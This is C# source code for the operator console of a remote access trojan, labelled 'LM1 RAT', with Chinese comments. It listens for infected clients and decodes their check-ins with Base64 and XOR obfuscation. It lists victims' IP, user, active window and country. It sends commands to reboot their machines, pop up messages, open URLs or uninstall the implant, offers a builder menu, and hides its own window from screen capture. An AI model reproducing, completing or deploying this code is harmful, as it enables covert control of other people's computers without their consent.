

using System;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Threading;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Text.Json;
using System.Timers;
using System.Collections.Concurrent;

namespace LMK
{
    public partial class MainForm : Form
    {
        private ContextMenuStrip blankContextMenu;
        private int listenPort = 5200;
        private System.Net.Sockets.TcpListener tcpListener;
        private ToolStripMenuItem settingsMenu;
        private ToolStripStatusLabel portStatusLabel;
        private Panel contentPanel;
        private DataGridView mainDataGridView;
        private Label autoTaskLabel;
        private DataGridView autoTaskDataGridView;
        private enum ContentType { Main, AutoTask }
        private ContentType currentContentType = ContentType.Main;
        // 在线主机字典，key为id，value为主机信息和最后心跳时间
        private ConcurrentDictionary<string, (Dictionary<string, string> info, DateTime lastSeen)> onlineClients = new();
        private System.Timers.Timer offlineCheckTimer;
        private readonly object dgvLock = new();
        // private System.Windows.Forms.Timer offlineTimer; // 已移除
        // 记录待卸载的主机IP
        private HashSet<string> uninstallQueue = new HashSet<string>();
        private int heartbeatInterval = 3; // 主控端心跳检测频率，秒
        public MainForm()
        {
            var (savedPort, savedHeartbeat) = SettingsForm.LoadSettings();
            listenPort = savedPort;
            heartbeatInterval = savedHeartbeat;
            InitializeComponent();
            InitUI();
        }

        private void InitUI()
        {
            // 设置窗体属性
            this.Text = "LM1 RAT";
            this.Width = 900;
            this.Height = 550;
            this.MinimumSize = new System.Drawing.Size(900, 550);
            this.Icon = new System.Drawing.Icon("ico/543zo-rtfv4-001.ico");

            // 配置菜单栏
            menuStrip1.Items.Clear();
            var clientMenu = new ToolStripMenuItem("客户");
            // var taskMenu = new ToolStripMenuItem("自动任务"); // 已移除
            var builderMenu = new ToolStripMenuItem("构建器");
            var aboutMenu = new ToolStripMenuItem("关于");
            settingsMenu = new ToolStripMenuItem("设置");
            menuStrip1.Items.AddRange(new ToolStripItem[] {
                clientMenu, builderMenu, settingsMenu, aboutMenu
            });
            settingsMenu.Click += SettingsMenu_Click;
            builderMenu.Click += (s, e) => {
                using (var dlg = new BuilderForm())
                {
                    dlg.ShowDialog();
                }
            };
            aboutMenu.Click += (s, e) => {
                using (var dlg = new AboutForm())
                {
                    dlg.ShowDialog();
                }
            };

            // 配置 DataGridView
            dataGridView1.Dock = DockStyle.Fill;
            dataGridView1.AllowUserToAddRows = false;
            dataGridView1.AllowUserToDeleteRows = false;
            dataGridView1.ReadOnly = true;
            dataGridView1.RowHeadersVisible = false;
            dataGridView1.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            dataGridView1.AllowUserToResizeRows = false;
            dataGridView1.AllowUserToOrderColumns = false;
            dataGridView1.Columns.Clear();
            dataGridView1.Columns.Add("ip", "IP地址");
            dataGridView1.Columns.Add("name", "昵称");
            dataGridView1.Columns.Add("tag", "标签");
            dataGridView1.Columns.Add("user", "用户@电脑");
            dataGridView1.Columns.Add("version", "版本");
            dataGridView1.Columns.Add("status", "状态");
            dataGridView1.Columns.Add("window", "当前窗口");
            dataGridView1.Columns.Add("userStatus", "用户状态");
            dataGridView1.Columns.Add("country", "国家");

            // 所有列等比例拉伸
            foreach (DataGridViewColumn col in dataGridView1.Columns)
            {
                col.AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
                col.FillWeight = 1;
                col.DefaultCellStyle.Alignment = DataGridViewContentAlignment.MiddleCenter;
                col.Resizable = DataGridViewTriState.False;
                col.SortMode = DataGridViewColumnSortMode.NotSortable;
            }
            // 设置 DataGridView 背景色为白色
            dataGridView1.BackgroundColor = System.Drawing.Color.White;
            dataGridView1.DefaultCellStyle.BackColor = System.Drawing.Color.White;
            dataGridView1.DefaultCellStyle.ForeColor = System.Drawing.Color.Black;
            dataGridView1.DefaultCellStyle.Font = new System.Drawing.Font("微软雅黑", 11);
            dataGridView1.DefaultCellStyle.SelectionBackColor = System.Drawing.Color.FromArgb(230, 240, 255); // 柔和浅蓝
            dataGridView1.DefaultCellStyle.SelectionForeColor = System.Drawing.Color.Black;
            dataGridView1.GridColor = System.Drawing.Color.White;
            dataGridView1.CellBorderStyle = DataGridViewCellBorderStyle.None;
            dataGridView1.BorderStyle = BorderStyle.None;
            // 恢复表头为系统默认样式
            dataGridView1.EnableHeadersVisualStyles = false;
            dataGridView1.ColumnHeadersDefaultCellStyle.BackColor = System.Drawing.Color.White;
            dataGridView1.ColumnHeadersDefaultCellStyle.ForeColor = System.Drawing.Color.Black;
            dataGridView1.ColumnHeadersDefaultCellStyle.SelectionBackColor = System.Drawing.Color.White;
            dataGridView1.ColumnHeadersDefaultCellStyle.SelectionForeColor = System.Drawing.Color.Black;

            // 设置窗体背景色为白色
            this.BackColor = System.Drawing.Color.White;

            // 配置状态栏
            statusStrip1.Items.Clear();
            portStatusLabel = new ToolStripStatusLabel($"监听端口: {listenPort}");
            statusStrip1.Items.Add(portStatusLabel);
            statusStrip1.Items.Add("已连接: 0");

            // 创建空白区域右键菜单
            blankContextMenu = new ContextMenuStrip();
            // 只保留有功能的菜单项
            var menu1 = new ToolStripMenuItem("系统管理");
            var deviceInfoMenuItem = new ToolStripMenuItem("查看设备信息");
            deviceInfoMenuItem.Click += (s, e) => MessageBox.Show("功能未实现");
            menu1.DropDownItems.Add(deviceInfoMenuItem);
            var remoteCmdMenuItem = new ToolStripMenuItem("远程CMD");
            remoteCmdMenuItem.Click += (s, e) => MessageBox.Show("功能未实现");
            menu1.DropDownItems.Add(remoteCmdMenuItem);
            // 新增：重启电脑菜单项
            var rebootComputerMenuItem = new ToolStripMenuItem("重启电脑");
            rebootComputerMenuItem.Click += (s, e) => RebootComputer();
            menu1.DropDownItems.Add(rebootComputerMenuItem);
            // 新增：文件管理菜单项
            var fileManagerMenuItem = new ToolStripMenuItem("文件管理");
            fileManagerMenuItem.Click += (s, e) => MessageBox.Show("功能未实现");
            menu1.DropDownItems.Add(fileManagerMenuItem);

            var menu5 = new ToolStripMenuItem("趣味功能");
            var remoteMsgBoxMenuItem = new ToolStripMenuItem("远程弹窗");
            remoteMsgBoxMenuItem.Click += (s, e) =>
            {
                string ip = null;
                if (mainDataGridView.SelectedRows.Count > 0)
                    ip = mainDataGridView.SelectedRows[0].Cells[0].Value?.ToString();
                if (!string.IsNullOrEmpty(ip))
                {
                    string text = Microsoft.VisualBasic.Interaction.InputBox("请输入要弹出的内容：", "远程弹窗", "");
                    if (!string.IsNullOrEmpty(text))
                    {
                        try
                        {
                            using (var client = new System.Net.Sockets.TcpClient())
                            {
                                client.Connect(ip, 5202);
                                var stream = client.GetStream();
                                var writer = new System.IO.StreamWriter(stream, System.Text.Encoding.UTF8) { AutoFlush = true };
                                writer.WriteLine($"MSGBOX:{text}");
                            }
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show($"发送失败: {ex.Message}");
                        }
                    }
                }
                else
                {
                    MessageBox.Show("请先选中要操作的主机！");
                }
            };
            menu5.DropDownItems.Add(remoteMsgBoxMenuItem);

            var remoteOpenUrlMenuItem = new ToolStripMenuItem("远程打开网页");
            remoteOpenUrlMenuItem.Click += (s, e) =>
            {
                string ip = null;
                if (mainDataGridView.SelectedRows.Count > 0)
                    ip = mainDataGridView.SelectedRows[0].Cells[0].Value?.ToString();
                if (!string.IsNullOrEmpty(ip))
                {
                    string url = Microsoft.VisualBasic.Interaction.InputBox("请输入要远程打开的网址：", "远程打开网页", "https://");
                    if (!string.IsNullOrEmpty(url))
                    {
                        try
                        {
                            using (var client = new System.Net.Sockets.TcpClient())
                            {
                                client.Connect(ip, 5202);
                                var stream = client.GetStream();
                                var writer = new System.IO.StreamWriter(stream, System.Text.Encoding.UTF8) { AutoFlush = true };
                                writer.WriteLine($"OPENURL:{url}");
                            }
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show($"发送失败: {ex.Message}");
                        }
                    }
                }
                else
                {
                    MessageBox.Show("请先选中要操作的主机！");
                }
            };
            menu5.DropDownItems.Add(remoteOpenUrlMenuItem);

            // 添加卸载客户端菜单项
            uninstallMenuItem = new ToolStripMenuItem("卸载客户端");
            uninstallMenuItem.Click += UninstallMenuItem_Click;
            menu1.DropDownItems.Add(uninstallMenuItem);

            blankContextMenu.Items.AddRange(new ToolStripItem[] { menu1, menu5 });
            // 绑定 DataGridView 右键事件
            dataGridView1.MouseDown += DataGridView1_MouseDown;
            dataGridView1.CellMouseDown += DataGridView1_CellMouseDown;

            // 内容区容器
            contentPanel = new Panel();
            contentPanel.Dock = DockStyle.Fill;
            contentPanel.BorderStyle = BorderStyle.None;
            this.Controls.Add(contentPanel);
            this.Controls.SetChildIndex(contentPanel, 0); // 保证内容区在菜单栏下方

            // 主内容区 DataGridView
            mainDataGridView = dataGridView1;
            mainDataGridView.Dock = DockStyle.Fill;
            mainDataGridView.BorderStyle = BorderStyle.None;

            // 自动任务内容区 DataGridView
            autoTaskDataGridView = new DataGridView();
            autoTaskDataGridView.Dock = DockStyle.Fill;
            autoTaskDataGridView.AllowUserToAddRows = false;
            autoTaskDataGridView.AllowUserToDeleteRows = false;
            autoTaskDataGridView.ReadOnly = true;
            autoTaskDataGridView.RowHeadersVisible = false;
            autoTaskDataGridView.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            autoTaskDataGridView.BackgroundColor = System.Drawing.Color.White;
            autoTaskDataGridView.DefaultCellStyle.BackColor = System.Drawing.Color.White;
            autoTaskDataGridView.Columns.Add("task", "任务");
            autoTaskDataGridView.Columns.Add("param1", "参数1");
            autoTaskDataGridView.Columns.Add("param2", "参数2");
            // 设置“任务”列自适应填充，参数1/参数2列宽度固定
            autoTaskDataGridView.Columns[0].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill; // 任务
            autoTaskDataGridView.Columns[1].Width = 150; // 参数1
            autoTaskDataGridView.Columns[2].Width = 150; // 参数2

            // 设置三列等比例拉伸
            foreach (DataGridViewColumn col in autoTaskDataGridView.Columns)
            {
                col.AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
                col.FillWeight = 1;
            }
            // 只显示横向分隔线
            autoTaskDataGridView.CellBorderStyle = DataGridViewCellBorderStyle.SingleHorizontal;

            // 自动任务内容区
            autoTaskLabel = new Label();
            autoTaskLabel.Text = "自动任务";
            autoTaskLabel.Dock = DockStyle.Fill;
            autoTaskLabel.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            autoTaskLabel.Font = new System.Drawing.Font("微软雅黑", 36, System.Drawing.FontStyle.Bold);

            // 默认显示主内容区
            ShowMainContent();
            currentContentType = ContentType.Main;

            // 菜单栏按钮事件
            clientMenu.Click += (s, e) => {
                if (currentContentType != ContentType.Main)
                {
                    ShowMainContent();
                    currentContentType = ContentType.Main;
                }
            };
            // 移除 taskMenu 相关事件和内容区切换逻辑
        }

        private void DataGridView1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                var hit = dataGridView1.HitTest(e.X, e.Y);
                if (hit.Type == DataGridViewHitTestType.Cell && hit.RowIndex >= 0)
                {
                    // 选中当前行
                    dataGridView1.ClearSelection();
                    dataGridView1.Rows[hit.RowIndex].Selected = true;
                    blankContextMenu.Show(dataGridView1, e.Location);
                }
            }
        }

        // 新增：无论左键还是右键点击行都选中
        private void DataGridView1_CellMouseDown(object sender, DataGridViewCellMouseEventArgs e)
        {
            if (e.RowIndex >= 0)
            {
                dataGridView1.ClearSelection();
                dataGridView1.Rows[e.RowIndex].Selected = true;
            }
        }

        private void SettingsMenu_Click(object sender, EventArgs e)
        {
            using (var dlg = new SettingsForm(listenPort, heartbeatInterval))
            {
                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    listenPort = dlg.ListenPort;
                    heartbeatInterval = dlg.HeartbeatInterval;
                    portStatusLabel.Text = $"监听端口: {listenPort}";
                    RestartListener();
                    if (offlineCheckTimer != null)
                    {
                        offlineCheckTimer.Interval = heartbeatInterval * 1000;
                    }
                }
            }
        }

        private void RestartListener()
        {
            try
            {
                if (tcpListener != null)
                {
                    tcpListener.Stop();
                }
                tcpListener = new System.Net.Sockets.TcpListener(System.Net.IPAddress.Any, listenPort);
                tcpListener.Start();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"监听端口失败: {ex.Message}", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            RestartListener();
            // 启动接收线程
            ThreadPool.QueueUserWorkItem(_ => ListenForClients());
            // 启动下线检测定时器
            offlineCheckTimer = new System.Timers.Timer(heartbeatInterval * 1000);
            offlineCheckTimer.Elapsed += (s, ev) => CheckOfflineClients();
            offlineCheckTimer.AutoReset = true;
            offlineCheckTimer.Start();
        }

        protected override void OnHandleCreated(EventArgs e)
        {
            base.OnHandleCreated(e);
            LMK.WindowAffinityHelper.SetExcludeFromCapture(this);
        }

        private void ShowMainContent()
        {
            contentPanel.Controls.Clear();
            contentPanel.Controls.Add(mainDataGridView);
        }
        // 移除 ShowAutoTaskContent 及相关变量
        // 移除 ContentType.AutoTask 相关内容

        // 监听客户端连接
        private void ListenForClients()
        {
            while (true)
            {
                try
                {
                    var client = tcpListener.AcceptTcpClient();
                    ThreadPool.QueueUserWorkItem(_ => HandleClient(client));
                }
                catch { Thread.Sleep(1000); }
            }
        }

        // 处理客户端数据（推送卸载命令）
        private void HandleClient(TcpClient client)
        {
            try
            {
                using (client)
                using (var stream = client.GetStream())
                using (var reader = new System.IO.StreamReader(stream))
                using (var writer = new System.IO.StreamWriter(stream) { AutoFlush = true })
                {
                    string line = reader.ReadLine();
                    if (!string.IsNullOrEmpty(line))
                    {
                        string json = Decrypt(line);
                        var info = JsonSerializer.Deserialize<Dictionary<string, string>>(json);
                        if (info != null && info.ContainsKey("id"))
                        {
                            string id = info["id"];
                            onlineClients.AddOrUpdate(id, (info, DateTime.Now), (k, v) => (info, DateTime.Now));
                            UpdateClientListUI();
                            // 检查是否需要卸载
                            if (uninstallQueue.Contains(id))
                            {
                                string cmd = Encrypt("uninstall");
                                writer.WriteLine(cmd);
                                uninstallQueue.Remove(id);
                            }
                            else
                            {
                                writer.WriteLine("");
                            }
                        }
                    }
                }
            }
            catch { }
        }

        // Base64+异或解密
        private string Decrypt(string input)
        {
            byte key = 0x5A;
            byte[] data = Convert.FromBase64String(input);
            for (int i = 0; i < data.Length; i++) data[i] ^= key;
            return Encoding.UTF8.GetString(data);
        }

        // Base64+异或加密
        private string Encrypt(string input)
        {
            byte key = 0x5A;
            byte[] data = Encoding.UTF8.GetBytes(input);
            for (int i = 0; i < data.Length; i++) data[i] ^= key;
            return Convert.ToBase64String(data);
        }

        // 右键菜单添加卸载功能
        private ToolStripMenuItem uninstallMenuItem;

        // 检查下线主机
        private void CheckOfflineClients()
        {
            var now = DateTime.Now;
            var offline = new List<string>();
            foreach (var kv in onlineClients)
            {
                if ((now - kv.Value.lastSeen).TotalSeconds > 15)
                {
                    offline.Add(kv.Key);
                }
            }
            foreach (var id in offline)
            {
                onlineClients.TryRemove(id, out _);
            }
            if (offline.Count > 0)
                UpdateClientListUI();
        }

        // 更新DataGridView显示
        private void UpdateClientListUI()
        {
            if (mainDataGridView.InvokeRequired)
            {
                mainDataGridView.Invoke(new Action(UpdateClientListUI));
                return;
            }
            lock (dgvLock)
            {
                // 记录当前选中行的唯一id（如有）
                string selectedId = null;
                if (mainDataGridView.SelectedRows.Count > 0 && mainDataGridView.SelectedRows[0].Index < onlineClients.Count)
                {
                    int rowIndex = mainDataGridView.SelectedRows[0].Index;
                    int i = 0;
                    foreach (var kv in onlineClients)
                    {
                        if (i == rowIndex) { selectedId = kv.Key; break; }
                        i++;
                    }
                }
                mainDataGridView.Rows.Clear();
                int rowToSelect = -1;
                int rowIdx = 0;
                foreach (var kv in onlineClients)
                {
                    var info = kv.Value.info;
                    mainDataGridView.Rows.Add(
                        info.GetValueOrDefault("ip", ""),
                        info.GetValueOrDefault("name", ""),
                        info.GetValueOrDefault("tag", ""),
                        info.GetValueOrDefault("user", ""),
                        info.GetValueOrDefault("version", ""),
                        info.GetValueOrDefault("status", ""),
                        info.GetValueOrDefault("window", ""),
                        info.GetValueOrDefault("userStatus", ""),
                        info.GetValueOrDefault("country", "")
                    );
                    if (kv.Key == selectedId) rowToSelect = rowIdx;
                    rowIdx++;
                }
                // 恢复选中行
                if (rowToSelect >= 0 && rowToSelect < mainDataGridView.Rows.Count)
                {
                    mainDataGridView.ClearSelection();
                    mainDataGridView.Rows[rowToSelect].Selected = true;
                }
                // 更新状态栏在线数
                if (statusStrip1.Items.Count > 1)
                {
                    statusStrip1.Items[1].Text = $"已连接: {onlineClients.Count}";
                }
            }
        }

        // 卸载客户端命令
        private void UninstallMenuItem_Click(object sender, EventArgs e)
        {
            if (mainDataGridView.SelectedRows.Count > 0)
            {
                var row = mainDataGridView.SelectedRows[0];
                // 取id而不是ip
                int rowIndex = row.Index;
                string id = null;
                int i = 0;
                foreach (var kv in onlineClients)
                {
                    if (i == rowIndex) { id = kv.Key; break; }
                    i++;
                }
                if (!string.IsNullOrEmpty(id) && onlineClients.ContainsKey(id))
                {
                    uninstallQueue.Add(id);
                }
            }
        }
        private void SendUninstallCommand(string id)
        {
            try
            {
                if (!onlineClients.ContainsKey(id)) return;
                var info = onlineClients[id].info;
                string clientIp = info["ip"];
                // 连接到客户端（假设客户端监听同一端口）
                using (TcpClient client = new TcpClient())
                {
                    client.Connect(clientIp, listenPort);
                    string cmd = Encrypt("uninstall");
                    var data = Encoding.UTF8.GetBytes(cmd + "\n");
                    client.GetStream().Write(data, 0, data.Length);
                }
            }
            catch { }
        }

        // 删除 ShowDeviceInfo、ShowRemoteCmd、ShowFileManager 方法体
        // 新增：重启电脑功能
        private void RebootComputer()
        {
            if (mainDataGridView.SelectedRows.Count == 0)
            {
                MessageBox.Show("请先选中要操作的主机！");
                return;
            }
            string ip = mainDataGridView.SelectedRows[0].Cells[0].Value?.ToString();
            if (string.IsNullOrEmpty(ip))
            {
                MessageBox.Show("无法获取主机IP！");
                return;
            }
            try
            {
                using (var client = new System.Net.Sockets.TcpClient())
                {
                    client.Connect(ip, 5202);
                    var stream = client.GetStream();
                    var writer = new System.IO.StreamWriter(stream, System.Text.Encoding.UTF8) { AutoFlush = true };
                    writer.WriteLine("REBOOT_COMPUTER");
                }
                MessageBox.Show("重启命令已发送。", "提示");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"发送失败: {ex.Message}");
            }
        }
    }
} 